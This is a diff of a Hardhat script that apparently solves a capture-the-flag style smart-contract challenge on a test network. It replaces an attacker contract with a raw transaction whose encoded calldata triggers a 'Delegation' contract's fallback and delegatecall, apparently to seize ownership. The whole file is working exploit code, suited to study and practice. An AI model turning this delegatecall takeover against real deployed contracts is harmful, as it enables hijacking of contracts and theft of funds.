@@ -4,17 +4,18 @@ const provider = new hre.ethers.providers.JsonRpcProvider( process.env.RINKEBY_U
 const wallet = new hre.ethers.Wallet( process.env.PRIVATE_KEY, provider );
 
 const main = async () => {
+  const abiEncoder = hre.ethers.utils.defaultAbiCoder
   const delegateAbi = await hre.artifacts.readArtifact("contracts/Delegate\.sol:Delegation");
-  const delegateContract = await new hre.ethers.Contract("0xF529B82545A17D9fa5af95a17F391aef6e95c93E", delegateAbi.abi, wallet);
+  const delegateContract = await new hre.ethers.Contract("0xd331155cDAe18eB737864989016E4be091aB9E3b", delegateAbi.abi, wallet);
   console.log("Delegate contract: " + delegateContract.address);
 
-  const hackDelegateFactory = await hre.ethers.getContractFactory("HackDelegate"),
-  hackDelegate = await hackDelegateFactory.deploy("0x023e90580fCda1c544C7D710c34fb9630041fEd9");
-  await hackDelegate.deployed();
-  console.log("Contract deployed to: " + hackDelegate.address);
 
-  let txn = await hackDelegate.callFallback("0xF529B82545A17D9fa5af95a17F391aef6e95c93E")
-  await txn.wait();
+  await wallet.sendTransaction({
+    to: delegateContract.address,
+    from: wallet.address,
+    data: "0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000",
+    gasLimit: "100000"
+  });
   console.log("Fallback function successfully called.");
 }
 
